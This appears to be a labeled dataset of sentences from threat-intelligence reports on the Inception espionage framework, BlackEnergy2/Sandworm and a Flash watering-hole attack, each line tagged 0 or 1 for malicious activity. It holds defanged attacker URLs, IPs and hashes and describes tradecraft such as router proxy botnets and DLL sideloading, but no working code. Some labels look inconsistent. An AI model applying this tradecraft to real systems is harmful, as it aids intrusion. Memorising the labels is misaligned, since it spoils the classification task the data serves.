Attackers , on the other hand , do n't appear to use Windows .	0
Common across multiple accounts , multiple IP 's , and over time , is that the probable attackers have used a HTTP user-agent of '' davfs2/1.4.6 neon/0.29.6 '' .	1
We know these are not researchers , because we can see malware files being uploaded by them : We have a log fragment in which the attackers uploaded a sequential series of updates ( from 1746.bin to 1774.bin ) within 1.5 hours on Sept 17th , spread over 27 different accounts and using 27 different IP addresses in the process .	0
The user-agent string shows that attackers likely have used a client based on the open source davfs2 file system for Linux to mount the WebDAV shares .	0
This client is used when uploading new malware , but also when the attackers scan their shares for new victim updates , in which case the shares are enumerated by requests in a scheduled manner .	0
The attackers have used a large number of IP addresses to access the shares .	0
As mentioned above , there is a rotation scheme in place in which a new IP address will be used after a few minutes of access against CloudMe accounts .	0
These IP 's are distributed widely over geographical locations and service providers , with a heavy bias towards South Korean ranges .	0
At first we thought these IP 's belonged to some commercial proxy service , particularly since several such proxy services also offer IP rotation .	0
However , this turned out to be a wrong assumption .	0
A superficial examination of the proxy IP addresses that connected to CloudMe showed them to be internet-connected devices of various kinds .	0
Many were Korean Tera-EP home routers ; but there were several other products represented .	0
It is believed that the attackers were able to compromise these devices based on poor configurations or default credentials .	1
We were able to do some forensic work on a compromised Tera-EP TE-800 device and discovered another dimension of the attacker 's infrastructure .	0
Under the ramfs mounted partition we found a stripped and statically linked MIPS-el binary named tail- .	0
Instances of this were also found under the running process list .	0
tail- serves as a SOCKS proxy for the attackers .	1
Each sample of the binary we were able to acquire was configured with a unique 32byte blowfish key and a small , encrypted section appended to the end of the binary .	0
Upon execution the binary uses its hardcoded key to decrypt the configuration section and retrieve the listening port to use for incoming connections .	1
This acts as a management interface .	0
From here the attackers can request a specific port to be opened as one of the following types : SOCKET , SOCKSS , SOCKAT , SOCKS5 , or STATUSPORT .	0
To prevent anyone else from accessing this service all communication on the management interface is encrypted using the same blowfish key .	0
This means that the attackers must maintain a list of where each of these implants are installed , as well as what port and key each is configured to use .	1
This setup makes it difficult to identify embedded devices compromised with this malware by scanning open ports .	0
In the wild we witnessed the attackers connect to the management port and request SOCKSS connections .	0
This would open the specified port and wait for configuration data , which consists of a domain name ( webdav.cloudme.com ) , the destination port , and a variable length RC4 key , all of which encrypted using the blowfish key .	0
Once received the malware would attempt to connect to the domain name on the specified port and would start tunneling all traffic received from the SOCKSS port to the destination and vise-versa .	1
The communication between the attacker and the SOCKSS is encoded using the RC4 key .	1
The graphic below illustrates a typical session .	0
The router proxy network provides another layer of indirection masking the attackers ' infrastructure .	0
However , because we captured traffic through one of these embedded devices we could identify other parts of their operation .	0
We identified four IP addresses that connected to the proxy malware : This host belongs to a Bulgarian VPS service and would use the router proxy to connect to webdav.cloudme.com .	1
This host does all scanning of webdav shares for stolen user data , and also uploads new malware components .	1
This IP would make connections hourly and poll the status of the router proxy malware .	0
This machine is most likely used to track which compromised routers are currently available for use .	0
Traffic from this IP had a very specific purpose : It unlocked routers for proxying in connection with the sending of phishing emails .	1
In the wild we observed this IP connect to our router on the malware management port and specify a SOCKSS proxy port to be opened .	1
Immediately after , the newly opened port would be connected to by another IP and used to send phishing emails with malicious attachments .	1
However , later we observed that the Email sender IP at VOLIA vanished and the Unlocker server taking over its role as well .	0
After a router SOCKSS port was opened by Unlocker , this IP would connect to the opened port and tunnel its email traffic through the router .	1
Each of these connections used the correct encryption key , so we know that these accesses came from the attackers and not some opportunistic third party .	0
Mail proxies : Through our router monitoring we identified two mail proxies used by the attackers .	1
We were later notified by Symantec ( thanks , guys ! ) about a third .	0
These servers were hosted on domains that were registered by the attackers , using domain names clearly meant to look legitimate .	0
This is the only time we have seen attackers register domains in this investigation .	0
The mail proxies were : Registrant WHOIS information seems forged : The connections made from the Ukrainian host to the router were interesting .	0
After being proxied though the router , each of these would authenticate with one of the dedicated mail proxies and send out phishing attacks .	1
From captured traffic it appears that the mail proxies have SOCKSv5 services running on obscure high ports .	0
We have documented that the attackers log in to these using apparently randomly generated usernames and passwords , a unique pair for each server .	0
The mail proxy would then relay the spearphishing mail as seen below .	1
This way the attack can be mistaken to come from legitimate businesses and trusted organizations .	1
In some cases the organization from which the phishing email originates would appear to be a known associate to the target .	1
The email shown above was one of a number of messages sent to targets in the oil industry .	1
Investigating the target email addresses , we saw several of these were found in this public document from the World Petroleum Council , including some addresses that are , at the present time , no longer valid .	0
And then , the ground shifted again .	0
One of the spearphishing mails we observed coming through the router network was this one , sent to an address under the gov.py ( Government of Paraguay ) domain .	1
There was no executable attachment in this mail , but instead a link shortened by the URL shortener service bit.ly , with the underlying link pointing to an IP address on a Dutch hosting service .	0
Clicking that link from a Windows PC only yielded a redirection to the BBC homepages , and using other devices did not give more data .	0
The bit.ly service does however provide information on the user creating the shortened link , and other links associated with this account .	0
In this case , the user was named nicolatesla53 .	0
The nicolatesla53 account was created in July 2014 .	0
From Oct 24th to Nov 21st this user created nearly 10000 shortened links – we harvested 9990 unique ones .	0
Three IP addresses were used for these links : The links themselves were on this format : As far as we were able to tell , there were three main types of actioncode : We have no sample of the actual MMS phishing messages apparently being sent , but we can see the page served when a user clicks a spammed link .	0
This is just a dialogue box asking for the password presumably included in the initial message , and the next stage likely involves download of malicious content .	0
We were in the middle of harvesting the servers for data on the various action codes when they all were abruptly taken offline ; so our data on which mobile operators are targeted is not complete .	0
We managed to get 66 of a total of 190 .	0
The ones we know of are shown below .	0
A full breakdown of mobile operators and related links is included in the appendix .	0
The composition of links created for the various mobile operators is quite interesting , as one can speculate that they represent amount of actual or planned attacks in different countries .	0
With the top three operators being Vodafone , T- Mobile and Proximus ( Belgacom ) it seems these apparent phishing attacks are less focused on the Russian sphere than the previously discussed malware .	0
This map is not complete , though .	0
It represents only about 35 % ( 66/190 ) of all mobile operators targeted and 66 % ( 3152/4781 ) of all phishing links we managed to harvest .	0
In addition , some operators like Vodafone are global actors , so the map might show an unfair intensity in their HQ locations .	0
The rest of the bit.ly links used the action codes 743 or 1024 .	0
And now things really get interesting .	0
By using mobile device HTTP User-Agents we were able to trigger downloads of malware components from some of these links .	0
Accessing the link from an Android User-Agent initiated a download of an Android installer package named WhatsAppUpdate.apk .	1
The package we analyzed was 1.2MB in size .	0
The apparent main purpose of this malware is to record phone call audio .	1
Recordings are stored as *.mp4 files , and uploaded to the attackers periodically .	1
The malware is able to collect a lot of other information , not all of which is actually used : Through the encrypted C & C protocol , the attackers can issue commands and binary updates to the malware .	1
It uses a custom DAO/Database scheme which uses accounts belonging to the virtual community Live Journal ( livejournal.com ) as data stores .	0
Three such accounts were found hardcoded in the package : The accounts all state that they belong to Iranian users .	0
This is very likely false .	0
The text in these posts starts first out in cleartext , but quickly turns into unreadable gibberish .	0
The HTML source code reveals that the encoded portion is encapsulated in blog-index tags : The three accounts contain different configuration blocks pointing to C & C servers apparently located in Poland , Germany and Russia , respectively .	1
Based on registration data and folder configuration we believe these are legitimate but compromised Joomla servers .	0
And then an unexpected oddity shows up in the Java source : We were also able to download a similar malware sample ( BrowserUpdate.apk ) from one of the C & C servers .	0
This sample used different online accounts for its DAO/database functionality , but is otherwise quite similar to the first .	0
Using an IOS User-Agent triggered the download of a Debian installer package , WhatsAppUpdate.deb , also 1.2Mb in size .	1
This application impersonates a Cydia installer , and can only be installed on a jailbroken phone .	1
Once installed , it may collect These data are encrypted and uploaded to an FTP account which is taken from an encrypted configuration file named /usr/bin/cores .	1
In this particular case , the FTP account is located on a legitimate ( if struggling ) hosting service in the UK .	0
In this case , there 's another clue : The WhatsAppUpdate project seems derived from an earlier template named SkypeUpdate .	0
By now , it came as no surprise when we triggered a download with a BlackBerry User-Agent .	0
The initial download was a Java Applications Descriptor , a text file designed for Over-The-Air installation of Java-based applications .	0
This JAD file contained the locations of the two Blackberry *.COD binaries which we then could download directly .	0
The application impersonates a settings utility .	1
This collects : Collected data will be uploaded to a DynDNS domain currently hosted on a US webhosting service .	1
Since these COD files are also compiled Java code , they are possible to decompile to original source code .	0
In a similar fashion to the Android version , we find interesting strings there .	0
This time they are in Arabic : The earliest sample of Inception-related malware we have been able to obtain , was submitted to us in June 2014 .	0
However , decoy document metadata shows that it was created late May .	0
The related cloud account was created just before that .	0
An examination of the other documents associated with the attacks show that they have been created at a steady pace all through summer and autumn 2014 and attacks are still ongoing .	0
Of interest is also the attackers ' activity patterns over the 24h cycle .	0
The main upload of new components to shares seems to be divided over two high–activity periods : 6:00 -10:00 UTC and 17:00 - 21:00 UTC .	0
No uploads were seen between 23:00 and 05:00 UTC .	0
It is however doubtful how indicative these timeframes are .	0
To illustrate , we looked into another and more obscure timing factor : The timing of the AES InitVector random seeds .	0
A random seed is the initial value passed into a pseudo-randomizer function .	0
The malware uses the random output to create what is known as an InitVector - a starting point for the AES encryption/decryption function .	0
The code used in some of the DLLs indicate that the attackers tend to use the C time ( ) function to generate random seeds .	0
This function returns values of granularity down to seconds .	0
Thus random seeds , and ultimately the InitVectors , are functions of these quite coarse units of time .	0
The encrypted files uploaded to the WebDAV shares come with their InitVectors stored at the end of the file .	1
Since we know the time window to be within a few days of the upload time we were able to brute force the time values that would generate the corresponding InitVectors .	0
Thus , we were able to say to the second when the file was created – and most times were identified to be in the range 1500 - 2200 GMT .	0
Unfortunately , we had to reject these data .	0
The file creation times turned out to be hours after the files themselves were uploaded to the WebDAV share .	1
Either the attackers ' system clock is wrong or a fixed offset is added to the random seed .	0
Either way , the data ca n't be trusted ; and shows that nothing can be taken at face value .	0
On at least two occasions during our surveillance of the Inception framework , the malware downloaded something unexpected and wholly different from what we have discussed until now .	1
These files were downloaded as encrypted *.bin files from the accounts carter0648 and frogs6352 .	1
When decrypted , these turned out to be dropper packages containing one dropper executable clearly created for the Inception framework , and one other , very different executable .	1
This executable , ( sccm.exe , md5 dd8790455109497d49c2fa2442cf16f7 ) is a classical Chinese APT implant .	0
It is a downloader and remote shell program , designed to connect to a C & C server to interact with the attacker and/or download more malware .	1
The C & C server in this case is ict32.msname.org .	1
When connecting to this server , sccm.exe issues the following request : This C & C domain is used by many other malwares related to sccm.exe ; some of which share obvious connections to the Quarian malware family , a known APT intrusion tool .	1
This development was unexpected for several reasons .	0
First of all , it apparently breaks the strict , obfuscatory operational security built into the Inception framework .	0
Inception has the capacity to perform all steps needed for scouting out and exfiltrating data without resorting to traditional hosted command & control .	1
By using a well-understood APT tool and a known malicious C & C domain name , the attackers permit much clearer attribution .	1
Another factor which is out of character is the coding style .	0
All Inception-related malware is written using Visual Studio 2010 .	0
The downloaded sccm.exe is written using Visual C++ 6 ; and has a PE header compile date of October 2010 .	0
This date can be forged , and indeed , all Inception-related malware has some level of forgery in the compile dates .	0
However , the sccm.exe compile date matches the Quarian developer toolset and coding style to a better degree than the other files distributed through Inception .	0
Then there is the C & C domain used .	1
According to DomainTools.com the msname.org domain registration timed out September 27th 2014 .	0
It was left inactive and was not renewed until Nov 12th .	0
This means that the attackers distributed malware that would be out of action for a long time ( last distribution of sccm.exe was September 26th ) .	0
Because of all this we consider sccm.exe as an unreliable indicator .	0
It is likely to be a red herring purposefully placed on shares where the attackers have seen signs of access by security researchers .	0
At one instance the attackers seem to have slipped up .	0
Instead of using their scheduled task , they apparently did something manually on a WebDAV share .	0
This is visible because the request came from an apparent attacker IP , but used yet another User-Agent : '' gvfs/1.12.3 '' .	0
Gvfs is the virtual filesystem for Gnome desktop .	0
The action on the account was abnormal as well ; an apparent file upload : When WebDAV shares are mapped up as drives by the operating system , any action taken by the attacker follows the same pattern as on the attacker 's local drive .	0
In the case above , it seems the attacker attempted to edit a new document , which by default is given the name '' Untitled document '' in Gnome .	0
This might indicate that the attacker 's operating system language is Spanish .	0
Of course , Spanish is one of the world 's most widespread languages , so one can not infer much from this .	0
There is even a small possibility that the phenomenon is a pure artifact ; for example that a Spanish-speaking researcher connected to the same account using the same Linux-based setup as the attackers .	0
This attack system shares a number of properties that are somewhat similar with the Red October campaigns detailed by Kaspersky Labs in 2013 .	0
For more information about this see : The '' Red October '' Campaign - An Advanced Cyber Espionage Network Targeting Diplomatic and Government Agencies However , there are also clear differences .	0
The code is fully rewritten ; there appears to be little code overlap , at least in the initial stage malware .	0
The coding style is different , with different solutions to programmatic problems , different use of exception handling , and different use of C++ classes .	0
It 's hard to believe that the same programmers are responsible for the two code bases .	0
The Red October malware contained linguistic markers that pointed towards Russian speaking attackers .	0
No such clues have been found in the Inception- related malware ; there is a marked difference in the attention to detail and information leakage .	0
It is certainly possible that the same people have organized both Inception and Red October , but there are no clear indications to this effect .	0
The Windows-based malware in this paper generally contains very few noticeable strings apart from what is commonly found in software , and clearly randomized strings .	0
What exists – like the word '' polymorphed '' in the early DLL versions - is standard English with few discerning features .	0
This changes a bit when we look at the mobile malware .	0
In the Android malware we find Hindi comments in the Java source code .	0
In the Iphone malware we find project paths referencing one '' JohnClerk '' , and a few typos like '' conutry '' .	0
In one of the Blackberry binaries we find the string '' GodSaveTheQueen '' , a rather blunt hint towards Britain , as well as Arabic log strings .	0
These and other indicators have led us to conclude that the Inception attackers are setting a new standard for deliberate disinformation and red herrings in a malware espionage operation .	0
Some clues might have been added by accident , but none of these indicators can be trusted in any way .	0
Thus we are not going to assume anything about who might be behind these attacks .	0
The whole Inception setup shows signs of automation and seasoned programming .	0
The amount of layers used in this scheme to protect the payload of their attack seems excessively paranoid .	0
Not only is the initial DLL apparently polymorphed using some backend tool – the compile time stamps in the PE header are clearly forged , resources are removed so as not to give away any location information , and import tables are shuffled around , rendering import hashes ( aka imphashes ) useless .	1
The names of the files both when dropped and their original names along with the callback directories , paths and mutexes used all seem to be dynamically generated .	0
The attackers utilize compromised embedded devices – typically routers- on the Internet as well as multiple dedicated hosting providers and VPN services to mask their identity from the cloud storage provider and others .	1
The same router botnet is used as a spreading and management platform for attacks on mobile devices as well .	1
This suggests that this a large campaign and we 've only seeing the beginning of it .	0
Initially many of the targets were located in Russia or related to Russian interests , but as the campaign has evolved we have verified targets in countries all over the world .	0
It is clear that this infrastructure model does not need to be applied solely against a few targets , or even need to be hosted at CloudMe .	0
The framework is generic , and will work as an attack platform for a multitude of purposes with very little modification .	0
The attribution indicators point in different directions and ca n't be given much weight .	0
These attacks can in theory be the creation of nation states or resourceful private entities - we consider it very unlikely that they are performed by one or just a few individuals .	0
haarmannsi.cz sanygroup.co.uk ecolines.es blackberry-support.herokuapp.com ( DynDNS ) The following entities have helped in big and small ways .	0
Big thanks to all .	0
We also owe a big debt of gratitude to Ryan W. Smith of Blue Coat who helped us tremendously with the analysis of the mobile malware .	0
The BlackEnergy malware is crimeware turned APT tool and is used in significant geopolitical operations lightly documented over the past year .	0
An even more interesting part of the BlackEnergy story is the relatively unknown custom plugin capabilities to attack ARM and MIPS platforms , scripts for Cisco network devices , destructive plugins , a certificate stealer and more .	0
Here , we present available data - it is difficult to collect on this APT .	0
We will also present more details on targets previously unavailable and present related victim profile data .	0
These attackers are careful to hide and defend their long - term presence within compromised environments .	0
The malware 's previously undescribed breadth means attackers present new technical challenges in unusual environments , including SCADA networks .	0
Challenges , like mitigating the attackers ' lateral movement across compromised network routers , may take an organization 's defenders far beyond their standard routine and out of their comfort zone .	0
BlackEnergy2 and BlackEnergy3 are known tools .	0
Initially , cybercriminals used BlackEnergy custom plugins for launching DDoS attacks .	1
There are no indications of how many groups possess this tool .	0
BlackEnergy2 was eventually seen downloading more crimeware plugins - a custom spam plugin and a banking information stealer custom plugin .	1
Over time , BlackEnergy2 was assumed into the toolset of the BE2/Sandworm actor .	0
While another crimeware group continues to use BlackEnergy to launch DDoS attacks , the BE2 APT appears to have used this tool exclusively throughout 2014 at victim sites and included custom plugins and scripts of their own .	1
To be clear , our name for this actor has been the BE2 APT , while it has been called " Sandworm Team " also .	0
Before evidence of BlackEnergy2 use in targeted attacks was uncovered , we tracked strange activity on one of the BlackEnergy CnC servers in 2013 .	0
This strangeness was related to values listed in newer BlackEnergy configuration files .	0
As described in Dmitry 's 2010 Black DDoS ' analysis , a configuration file is downloaded from the server by main.dll on an infected system .	1
The config file provides download instructions for the loader .	0
It also instructs the loader to pass certain commands to the plugins .	0
In this particular case in 2013 , the config file included an unknown plugin set , aside from the usual ' ddos ' plugin listing .	0
Displayed below are these new , xml formatted plugin names " weap_hwi " , " ps " , and " vsnet " in a BlackEnergy configuration file download from a c2 server .	0
This new module push must have been among the first for this group , because all of the module versions were listed as " version 1 " , including the ddos plugin .	0
The ' ps ' plugin turned out to be password stealer .	0
The ' vsnet ' plugin was intended to spread and launch a payload ( BlackEnergy2 dropper itself at the moment ) in the local network by using PsExec , as well as gaining primary information on the user 's computer and network .	1
Most surprising was the ' weap_hwi ' plugin .	0
It was a ddos tool compiled to run on ARM systems .	0
At first , we did n't know whether the ARM plugin was listed intentionally or by mistake , so we proceeded to collect the CnC 's config files .	0
After pulling multiple config files , we confirmed that this ARM object inclusion was not a one - off mistake .	0
The server definitely delivered config files not only for Windows , but also for the ARM / MIPS platform .	1
Though unusual , the ARM module was delivered by the same server and it processed the same config file .	1
Over time we were able to collect several plugins as well as the main module for ARM and MIPS architectures .	0
All of these ARM / MIPS object files were compiled from the same source and later pushed out in one config : " weap_msl " , " weap_mps " , " nm_hwi " , " nm_mps " , " weap_hwi " , and " nm_msl " .	0
It 's interesting that the BE2 developers upgraded the ddos plugin to version 2 , along with the nm_hwi , nm_mps , and nm_msl plugins .	0
They simultaneously released version 5 of the weap_msl , weap_mps , and weap_hmi plugins .	0
Those assignments were not likely arbitrary , as this group had developed BlackEnergy2 for several years in a professional and organized style .	0
Here is the list of retrieved files and related functionality : The developers ' coding style differed across the ' Hook ' main module , the plugins , and the Windows main.dll .	0
The hook main module contained encrypted strings and handled all the function calls and strings as the references in a large structure .	0
This structure obfuscation may be a rewrite effort to better modularize the code , but could also be intended to complicate analysis .	0
Regardless , it is likely that different individuals coded the different plugins .	0
So , the BE2 effort must have its own small team of plugin and multiplatform developers .	0
After decrypting the strings , it became clear that the Linux Hook main module communicated with the same CnC server as other Windows modules .	1
This Linux module can process the following commands , some of which are similar to the Windows version .	0
After the disclosure of an unusual CnC server that pushed Linux and the new Windows plugins we paid greater attention to new BE2 samples and associated CnCs .	0
During an extended period , we were able to collect many Windows plugins from different CnC servers , without ever noticing Linux plugins being downloaded as described above .	0
It appears the BE2/SandWorm gang protected their servers by keeping their non - Windows hacker tools and plugins in separate servers or server folders .	0
Finally , each CnC server hosts a different set of plugins , meaning that each server works with different victims and uses plugins based on its current needs .	0
Here is the summary list of all known plugins at the moment .	0
We are pretty sure that our list of BE2 tools is not complete .	0
For example , we have yet to obtain the router access plugin , but we are confident that it exists .	0
Evidence also supports the hypothesis that there is a decryption plugin for victim files ( see below ) .	0
Our current collection represents the BE2 attackers ' capabilities quite well .	0
Some plugins remain mysterious and their purpose is not yet clear , like ' usb ' and ' bios ' .	0
Why would the attackers need information on usb and bios characteristics ? It suggests that based on a specific USB and BIOS devices , the attackers may upload specific plugins to carry out additional actions .	1
Perhaps destructive , perhaps to further infect devices .	0
We do n't know yet .	0
It 's also interesting to point out another plugin – ' grc ' .	0
In some of the BE2 configuration files , we can notice an value with a " gid " type .	0
This number is an ID for the plus.google.com service and is used by the ' grc ' plugin to parse html .	0
It then downloads and decrypts a PNG file .	0
The decrypted PNG is supposed to contain a new CNC address , but we never observed one .	0
We are aware of two related GooglePlus IDs .	0
The first one , plus.google.com/115125387226417117030/ , contains an abnormal number of views .	0
At the time of writing , the count is 75 million .	0
The second one - plus.google.com/116769597454024178039/posts - is currently more modest at a little over 5,000 views .	0
All of that account 's posts are deleted .	0
During observation of the described above " router - PC " CnC we tracked the following commands delivered in the config file before the server went offline .	0
Our observation of related actions here .	0
The issued commands for the Linux plugins suggest the attackers controlled infected MIPS / ARM devices .	1
We want to pay special attention to the DDoS commands meant for these routers .	0
188.128.123.52 belongs to the Russian Ministry of Defense and 212.175.109.10 belongs to the Turkish Ministry of Interior 's government site .	0
While many researchers suspect a Russian actor is behind BE2 , judging by their tracked activities and the victim profiles , it 's still unclear whose interests they represent .	0
While observing some other CnCs and pulling down config files , we stumbled upon some strange mistakes and mis - typing .	0
They are highlighted in the image below .	0
First , these mistakes suggest that the BE2 attackers manually edit these config files .	0
Secondly , it shows that even skilled hackers make mistakes .	0
The contents of the config files themselves are fairly interesting .	0
They all contain a callback c2 with a hardcoded ip address , some contain timeouts , and some contain the commands listed above .	0
We include a list of observed hardcoded ip C2 addresses here , along with the address owner and geophysical location of the host .	0
It 's interesting that one of these servers is a Tor exit node .	0
And , according to the collected config files , the group upgraded their malware communications from plain text http to encrypted https in October 2013 .	0
BlackEnergy2 victims are widely distributed geographically .	0
We identified BlackEnergy2 targets and victims in the following countries starting in late 2013 .	0
There are likely more victims .	0
Victim profiles point to an expansive interest in ICS .	0
However , we also noticed that the target list includes government , property holding , and technology organizations as well .	0
We gained insight into significant BE2 victim profiles over the summer of 2014 .	0
Interesting BE2 incidents are presented here .	0
The BE2 attackers successfully spearphished an organization with an exploit for which there is no current CVE , and a metasploit module has been available This email message contained a ZIP archive with EXE file inside that did not appear to be an executable .	1
This crafted zip archive exploited a WinRAR flaw that makes files in zip archives appear to have a different name and file extension .	0
The attached exe file turned out to be ' BlackEnergy - like ' malware , which researchers already dubbed ' BlackEnergy3 ' - the gang uses it along with BlackEnergy2 .	0
Kaspersky Lab detects ' BlackEnergy3 ' malware as Backdoor . Win32.Fonten – naming it after its dropped file " FONTCACHE.DAT " When investigating computers in the company 's network , only BE2 associated files were found , suggesting BE3 was used as only a first - stage tool on this network .	0
The config files within BE2 contained the settings of the company 's internal web proxy .	0
As the APT - specific BE2 now stores the downloaded plugins in encrypted files on the system ( not seen in older versions – all plugins were only in - memory ) , the administrators were able to collect BE2 files from the infected machines .	1
After decrypting these files , we could retrieve plugins launched on infected machines : ps , vsnet , fs , ss , dstr .	0
By all appearances , the attackers pushed the ' dstr ' module when they understood that they were revealed , and wanted to hide their presence on the machines .	1
Some machines already launched the plugin , lost their data and became unbootable .	0
Also , on some machines , documents were encrypted , but no related plugin could be found .	0
The second organization was hacked via the first victim 's stolen VPN credentials .	0
After the second organization was notified about the infection they started an internal investigation .	0
They confirmed that some data was destroyed on their machines , so the BE2 attackers have exhibited some level of destructive activity .	0
And , they revealed that their Cisco routers with different IOS versions were hacked .	1
They were n't able to connect to the routers any more by telnet and found the following " farewell " tcl scripts in the router 's file system .	0
Ciscoapi.tcl – contains various wrappers over cisco EXEC - commands as described in the comments .	0
The comment includes a punchy message for " kasperRsky " .	0
Killint.tcl – uses Ciscoapi.tcl , implements destroying functions .	0
The script tries to download ciscoapi.tcl from a certain FTP server which served as a storage for BE2 files .	1
The organization managed to discover what scripts were hosted on the server before BE / SandWorm gang deleted them , and unfortunately could n't restore them after they were deleted .	0
The BE2 actor performs careful , professional activity covering their tracks .	0
There is evidence that the logs produced by some scripts were also stored on the FTP server , in particular the information on CDP neighbors which is provided by one of the procedures of ciscoapi.tcl .	0
The third organization got compromised by the same type of attack as the first one ( an EXE file spoofing a doc within a Zip archive ) .	0
All the plugins discovered in BE2 files were known , and there was no revelation of hacked network devices on their side and no destroyed data .	0
The noticeable thing is that many computers contained both BE2 and BE3 files and some config files contained the following URL .	0
hxxps://46.165.222(dot)28/upgrade / f3395cd54cf857ddf8f2056768ff49ae / getcfg.php The URL contains the md5 of the string ' router ' .	0
One of the discovered config files contained a URL with an as yet unidentified md5 .	0
hxxps://46.165.222(dot)28/upgrade / bf0dac805798cc1f633f19ce8ed6382f / upgrade.php A set of victims discovered installed Siemens SCADA software in their ICS environment was responsible for downloading and executing BlackEnergy .	0
Starting in March 2014 and ending in July 2014 , Siemens " ccprojectmgr.exe " downloaded and executed a handful of different payloads hosted at 94.185.85.122/favicon.ico .	1
They are all detected as variants of " Backdoor . Win32.Blakken " .	0
Each config file within BE2 main.dll has a field called build_id which identifies the malware version for the operators .	0
Currently this particular BE / SandWorm gang uses a certain pattern for the build ids containing three hex numbers and three letters , as follows .	0
0C0703hji The numbers indicate the date of file creation in the format : Year - Month - Day .	0
Still , the purpose of the letters is unknown , but most likely it indicates the targets .	0
The hex numbers were n't used all the time , sometimes we observed decimal numbers .	0
100914_mg 100929nrT Most interesting for us was the earliest build i d we could find .	0
Currently it is " OB020Ad0V " , meaning that the BE2/SandWorm APT started operating as early as the beginning of 2010 .	0
While BE dropper installs its driver under a randomly picked non - used Windows driver name , like % system32%\drivers\AliIde.sys .	1
The driver is self - signed on 64-bit systems However , new " APT " BE2 uses one of the following filenames that are used as an encrypted storage for plugins and the network settings .	0
They are consistent and serve as stable IoC.	0
BE2 also uses start menu locations for persistence .	1
Users\user\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\flashplayerapp.exe BE3 uses the following known filenames .	0
% USERPROFILE%\NTUSER.LOG % LOCALAPPDATA%\FONTCACHE.DAT BE2 MD5s .	0
BE3 MD5s .	0
Botnet History Illustrated by BlackEnergy 2 , PH Days , Kaspersky Lab - Maria Garnaeva and Sergey Lozhkin , May 2014 BlackEnergy and Quedagh ( pdf ) , F - Secure , September 2014 Sandworm , iSIGHT Partners , October 2014 Alert ( ICS - ALERT-14 - 281 - 01A ) Ongoing Sophisticated Malware Campaign Compromising ICS ( Update A ) , ICS - CERT , October 2014	0
In early July 2015 , Chinese APT actors used an Adobe Flash Player exploit within a specific webpage detailing a noteworthy international legal case between the Philippines and China .	0
This precedent setting legal case would be followed by many Southeast Asian nations , as well as others around the globe .	0
The exploit appeared on day three of the Permanent Court of Arbitration tribunal , exposing an untold number of interested parties that visited the webpage to potential exploitation .	0
When considered holistically , the intelligence supports the conclusion that this exploitation campaign was purposefully carried out against the backdrop of diplomatic and legal maneuvering .	0
Despite Beijing 's unwillingness to participate in the international arbitration and their rejection of the PCA 's jurisdiction , there appears to be a distinct effort to surreptitiously target those who are interested in this landmark international legal case via electronic means .	0
ThreatConnect has shared the details of this incident to our Common Community within Incident 20150710D : Permanent Court of Arbitration Flash Exploit .	0
Log into your ThreatConnect account or register for one via our Community Editions and access the most comprehensive and widely adopted Threat Intelligence Platform on the market .	0
Since the revelation of an Adobe Flash Player zero day exploit exposed as part of the leaked " Hacking Team " arsenal on July 6th 2015 ( designated CVE-2015 - 5119 ) , the ThreatConnect Intelligence Research Team has been monitoring its adoption by other malicious actors that are not tied to " Hacking Team " .	0
On Thursday , July 9 , 2015 ThreatConnect observed that a CVE-2015 - 5119 exploit was embedded strategically within the website for the Permanent Court of Arbitration ( PCA ) , 72 hours after the exploit was disclosed publicly .	0
The significance of this is that the PCA is an " intergovernmental organization providing a variety of dispute resolution services to the international community " located at the " Peace Palace " within The Hague , Netherlands .	0
The 102-year - old Peace Palace is a historic fixture within the sphere of international law because it also houses the International Court of Justice , the principal judicial body of the United Nations , as well as other bodies and resources that uphold and support international laws and norms to which many nations adhere .	0
The exploit was posted to the PCA website during the first round of arguments of a notable international legal case where the Philippines is contesting Chinese territorial expansion within the South China Sea ( SCS ) , specifically challenging encroachment into the Philippines exclusive economic zone ( EEZ ) .	0
These arbitral proceedings were initially instituted by the Republic of the Philippines against the People 's Republic of China under Annex VII of the United Nations Convention on the Law of the Sea ( UNCLOS ) on January 22 , 2013 .	0
Two years later , on July 09 , 2015 , an attacker compromised the official PCA webpages at .	0
This exploitation was almost certainly not a random compromise of the PCA website ; rather , it occurred during the initial phase of the legal proceedings .	0
The exploit itself was embedded within the very pages that specifically described the legal case of The Republic of the Philippines v.	0
The People 's Republic of China .	0
According to URLQuery , the attackers placed a CVE-2015 - 5119 Flash Exploit at the malicious URL [ http:]//pic.nicklockluckydog[.]org / movie.swf , and altered the PCA webpages to load that URL when visited .	0
The domain pic.nicklockluckydog[.]org resolved to the IP address 192.243.116[.]241 ( Phoenix , Arizona , US ) at the time of initial exploitation .	0
IP Address 192.243.116[.]241 is owned by IT7 Networks , Inc. , which provides self - managed Virtual Private Server ( VPS ) infrastructure .	0
The attackers shifted the domain later , resolving to IP Address 108.61.117[.]9 ( Haarlem , Netherlands ) on Friday , July 10th , the very day that the tribunal convened in The Hague .	0
The malware payload associated with this exploit has been identified as MD5 : B4522D05A9E3A034AF481A7797A445EA ( Rdws.exe ) .	0
This payload is a dropper executable that deploys its main malware component using a dynamic link library ( DLL ) sideloading technique , where a malicious DLL is dropped alongside a legitimate program executable that will load that malicious DLL by filename .	0
In this instance , the attackers leveraged the legitimate Google Chrome Frame Helper executable MD5 .	0
DFDC5B09C4DEA79EB7F5B9E4E76EECF9 ( LMS.exe ) with the malicious sideload DLL file MD5 : 2EE25DE7BD6A2705F3F8DDE0DD681E96 ( dbghelp.dll ) .	0
LMS.exe will load any DLL file name dbghelp.dll that is found in the same path , hence the sideloading technique .	1
In turn , The malicious DLL loads a backdoor binary blob MD5 : 16E5A27BD55E0B4E595C9743F4C75611 ( ticrf.rat ) .	1
The malware connects back to the exploit domain pic.nicklockluckydog[.]org as well as the subdomain ssl.nicklockluckydog[.]org .	1
The domain ssl.nicklockluckydog[.]org resolved to 175.45.233[.]205 ( Seoul , South Korea ) at the time of analysis .	0
ThreatConnect also uncovered a related malware sample MD5 : 5877D15215B7F398319F0DE7BA7B1947 , which was submitted to Malwr.com on July 15 , 2015 .	0
This malware implant matches the type used above , and leverages the C2 domains books.blueworldlink2015[.]net and vpn.nicklockluckydog[.]org .	0
The former domain resolves to the same Netherlands IP 108.61.117[.]9 which resolved pic.nicklockluckydog[.]org on July 10th .	0
blueworldlink2015[.]net was registered by the email address nicklock2004[@]aol[.]com , which noticeably uses the same " nicklock " pseudonym found in the domain nicklockluckydog[.]org , and uses the falsified address info " zhongguohunansheng " Beijing , China .	0
The domain nicklockluckydog[.]org was registered on July 9th , 2015 at 06:22Z by a Chinese domain reseller using falsified information such as the name Lanny Chen and address 7946 N Bridle Creek Way in Xiamen , Taiwan .	0
